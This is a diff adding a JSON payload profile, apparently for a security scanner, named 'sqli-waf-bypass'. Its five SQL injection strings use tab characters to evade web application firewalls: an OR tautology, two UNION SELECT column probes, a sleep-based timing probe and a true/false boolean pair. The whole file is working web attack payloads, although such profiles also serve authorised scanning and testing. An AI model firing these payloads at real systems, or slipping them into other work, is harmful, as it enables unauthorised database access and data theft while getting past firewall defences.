@@ -1,0 +1,11 @@
+{
+  "schema_version": "1.0",
+  "payload_profile_id": "sqli-waf-bypass",
+  "payloads": [
+    {"payload_case_id": "bypass-tab-or", "type": "single", "value": "'\tor\t'1'='1'--\t"},
+    {"payload_case_id": "bypass-tab-union-2col", "type": "single", "value": "'\tunion\tselect\tNULL,NULL--\t"},
+    {"payload_case_id": "bypass-tab-union-3col", "type": "single", "value": "'\tunion\tselect\tNULL,NULL,NULL--\t"},
+    {"payload_case_id": "bypass-tab-sleep", "type": "single", "value": "'\tor\tsleep(3)--\t"},
+    {"payload_case_id": "bypass-boolean-pair", "type": "boolean_pair", "true_value": "x'\tor\t'1'='1'--\t", "false_value": "x'\tor\t'1'='2'--\t"}
+  ]
+}
